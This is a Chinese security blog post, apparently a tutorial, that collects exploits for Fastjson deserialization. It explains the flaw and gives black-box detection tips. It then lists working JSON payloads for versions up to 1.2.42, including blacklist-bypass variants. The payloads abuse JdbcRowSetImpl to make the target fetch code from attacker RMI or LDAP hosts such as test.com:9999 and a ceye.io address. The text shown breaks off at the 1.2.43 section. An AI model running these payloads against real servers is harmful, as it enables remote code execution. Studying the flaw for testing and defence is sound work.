<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32-next.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16-next.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"fz1lin.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="Fastjson 概述,漏洞利用,不出网利用合集">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson漏洞利用合集">
<meta property="og:url" content="https://fz1lin.com/2022/498480683/index.html">
<meta property="og:site_name" content="丰梓林的博客">
<meta property="og:description" content="Fastjson 概述,漏洞利用,不出网利用合集">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fz1lin.com/2022/498480683/image.png">
<meta property="og:image" content="https://fz1lin.com/2022/498480683/image.png">
<meta property="og:image" content="https://fz1lin.com/2022/498480683/image.png">
<meta property="article:published_time" content="2022-08-19T13:19:14.000Z">
<meta property="article:modified_time" content="2022-08-20T02:37:03.163Z">
<meta property="article:author" content="fz1lin">
<meta property="article:tag" content="Fastjson">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fz1lin.com/2022/498480683/image.png">


<link rel="canonical" href="https://fz1lin.com/2022/498480683/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fz1lin.com/2022/498480683/","path":"2022/498480683/","title":"Fastjson漏洞利用合集"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Fastjson漏洞利用合集 | 丰梓林的博客</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SHBHTBP9QE"></script>
  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-SHBHTBP9QE","only_pageview":false}</script>
  <script src="/js/third-party/analytics/google-analytics.js"></script>

  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
  <script async src="https://hm.baidu.com/hm.js?94d58b4f069475a3f156286ffb096bc8"></script>


<link rel="dns-prefetch" href="https://blog-api-25jf3kruh-fz1lin.vercel.app/">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="丰梓林的博客" type="application/atom+xml">
<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}</style></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">丰梓林的博客</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">想做一个剑客，但手里没有合适的剑</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a></li>
        <li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
        <li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
        <li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-comment fa-fw"></i>留言</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Fastjson-%E6%A6%82%E8%BF%B0"><span class="nav-text">0x01 Fastjson 概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">1.应用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A5%E5%8F%A3%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE"><span class="nav-text">接口返回数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90Token"><span class="nav-text">生成Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E4%B8%BA%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">作为配置文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="nav-text">2.黑盒测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">0x02 fastjson 反序列化漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="nav-text">名词解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-24"><span class="nav-text">fastjson&lt;&#x3D;1.2.24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-41"><span class="nav-text">fastjson&lt;&#x3D;1.2.41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-42"><span class="nav-text">fastjson&lt;&#x3D;1.2.42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-43"><span class="nav-text">fastjson&lt;&#x3D;1.2.43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-45"><span class="nav-text">fastjson&lt;&#x3D;1.2.45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-47"><span class="nav-text">fastjson&lt;&#x3D;1.2.47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-62"><span class="nav-text">fastjson&lt;&#x3D;1.2.62</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-lt-1-2-66"><span class="nav-text">fastjson&lt;&#x3D;1.2.66</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Fastjson-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">0x03 Fastjson 漏洞利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91EXP"><span class="nav-text">编译EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AERMI%E7%8E%AF%E5%A2%83"><span class="nav-text">配置RMI环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8RMI%E6%9C%8D%E5%8A%A1%E7%9B%91%E5%90%AC"><span class="nav-text">启动RMI服务监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="nav-text">0x04 各个版本利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-24"><span class="nav-text">fastjson 1.2.24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-47"><span class="nav-text">fastjson 1.2.47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-68"><span class="nav-text">fastjson 1.2.68</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-text">0x05 Fastjson不出网利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-bytecodes%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Poc-TemplatesImpl"><span class="nav-text">反序列化-_bytecodes直接反序列化Poc  TemplatesImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><span class="nav-text">org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">0x06 综合利用脚本</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fz1lin"
      src="/images/avatar1.gif">
  <p class="site-author-name" itemprop="name">fz1lin</p>
  <div class="site-description" itemprop="description">愿所有美好都如期而至</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/fz1lin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fz1lin" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/fengzilin.blog@gmail.com" title="E-Mail → fengzilin.blog@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/fz1lin" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fz1lin" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://fz1lin.com/2022/498480683/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar1.gif">
      <meta itemprop="name" content="fz1lin">
      <meta itemprop="description" content="愿所有美好都如期而至">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="丰梓林的博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Fastjson漏洞利用合集
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-19 21:19:14" itemprop="dateCreated datePublished" datetime="2022-08-19T21:19:14+08:00">2022-08-19</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-20 10:37:03" itemprop="dateModified" datetime="2022-08-20T10:37:03+08:00">2022-08-20</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
        </span>
    </span>

  
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2022/498480683/#waline-comments" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" id="/2022/498480683/" data-xid="/2022/498480683/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>13 分钟</span>
    </span>
</div>

            <div class="post-description">Fastjson 概述,漏洞利用,不出网利用合集</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="0x01-Fastjson-概述"><a href="#0x01-Fastjson-概述" class="headerlink" title="0x01 Fastjson 概述"></a>0x01 Fastjson 概述</h1><h2 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h2><h3 id="接口返回数据"><a href="#接口返回数据" class="headerlink" title="接口返回数据"></a>接口返回数据</h3><ol>
<li>Ajax异步访问数据</li>
<li>RPC远程调用</li>
<li>前后端分离后端返回的数据</li>
<li>开放API(一些公司开放接口的时候，我们点击请求，返回的数据是JSON格式的)</li>
<li>企业间合作接口(数据对接的时候定义的一种规范，确定入参，出差)</li>
</ol>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>将对象数据转换为JSON格式，利用JSON来实现序列化存储在磁盘中。</p>
<h3 id="生成Token"><a href="#生成Token" class="headerlink" title="生成Token"></a>生成Token</h3><p>也就是使用json将一些数据封装起来当做访问一些应用的令牌。</p>
<h3 id="作为配置文件"><a href="#作为配置文件" class="headerlink" title="作为配置文件"></a>作为配置文件</h3><p>eg：<code>npm的package.json</code>包管理配置文件</p>
<p>不过一般情况下使用json作为配置文件的情况很少，并不建议使用。</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.codeleading.com/article/82974738889/">https://www.codeleading.com/article/82974738889/</a></p>
<h2 id="2-黑盒测试"><a href="#2-黑盒测试" class="headerlink" title="2.黑盒测试"></a>2.黑盒测试</h2><p>Fastjson是阿里巴巴公司开源的一款JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。</p>
<p>它采用一种“假定有序快速匹配”的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>目标站点如果报错的话一般使用不闭合&#123;花括号或者多添加<span class="string">&quot;双引号来进行测试&quot;</span>  <span class="comment"># &#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>fastjson与jackson区别，如果请求包中的 json 如下:</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>&#125;</span><br><span class="line">追加一个随机 key ,修改 json 为</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">21</span>,<span class="string">&quot;agsbdkjada__ss_d&quot;</span>:<span class="number">123</span>&#125;</span><br><span class="line">这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,</span><br><span class="line">所以会报错,服务器的响应包中多少会有异常回显</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>dos检测 dos</span><br><span class="line">&#123;<span class="string">&quot;a:&quot;</span>\x 看返回时间</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>如果是json字符串中name字段存在反序列化</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;wangwei&quot;</span>&#125;那么poc就是</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://fatjaon.tuq75v.ceye.io&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:true&#125;&#125;</span><br><span class="line"></span><br><span class="line">小tips</span><br><span class="line"><span class="number">1.</span>在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢</span><br><span class="line"><span class="number">2.</span>poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1<span class="number">.6</span></span><br></pre></td></tr></table></figure>

<h1 id="0x02-fastjson-反序列化漏洞原理"><a href="#0x02-fastjson-反序列化漏洞原理" class="headerlink" title="0x02 fastjson 反序列化漏洞原理"></a>0x02 fastjson 反序列化漏洞原理</h1><p><img src="/2022/498480683/image.png" alt="img"> </p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p><strong>@type</strong></p>
<blockquote>
<p>指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在poc中，<code>_bytecodes</code>与<code>_name</code>都是私有属性，所以要想反序列化这两个，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code></p>
</blockquote>
<h2 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h2><p>因为不让属性，找错类型<code>@type</code>  引入了<code>autotype</code> ，<code>com.sun.rowset.JdbcRowSetImpl </code>一定会被读取加载</p>
<p><code>com.sun.rowset.JdbcRowSetImpl</code>是个恶意类，默认对属性不做任何处理，导致了反序列化，可以任意执行命令</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp 1.2.24</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h2><p>既1.2.25版本之后设置了<code>autoTypeSupport</code>属性默认为<code>false</code>，并且增加了<code>checkAutoType()</code>函数，修复是用了白名单，后面是通过绕过白名单来进行攻击的<code>com.sun.rowset.JdbcRowSetImpl</code>在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以”<code>L</code>”开头、以”<code>;</code>”结尾，是的话就提取出其中的类名再加载进来，因此在原类名头部加<code>L</code>，尾部加<code>;</code>即可绕过黑名单的同时加载类。</p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>autoTypeSupport</code>属性为<code>true</code>才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<h2 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h2><p>如果输入类名的开头和结尾是<code>L</code>和<code>;</code>就将头和尾去掉，再进行黑名单验证。 还把黑名单的内容进行了加密，黑名单包类：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/LeadroyaL/fastjson-blacklist%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E5%9C%A8%E7%B1%BB%E5%90%8D%E5%A4%96%E9%83%A8%E5%B5%8C%E5%A5%972%E5%B1%82L;%E3%80%82">https://github.com/LeadroyaL/fastjson-blacklist </a>绕过方法，在类名外部嵌套2层<code>L;</code>原类名：<code>com.sun.rowset.JdbcRowSetImpl</code> 绕过：<code> LLcom.sun.rowset.JdbcRowSetImpl;;</code></p>
<p>EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<h2 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h2><p>fastjson在1.2.43中<code>checkAutoType()</code>函数增加判断开头为<code>LL</code>直接报错。 绕过方法: 根据fastjson判断函数，<code>[</code>开头则提取类名，且后面字符字符为”<code>[</code>“、”<code>&#123;</code>“等，即可正常调用</p>
<p>EXP</p>
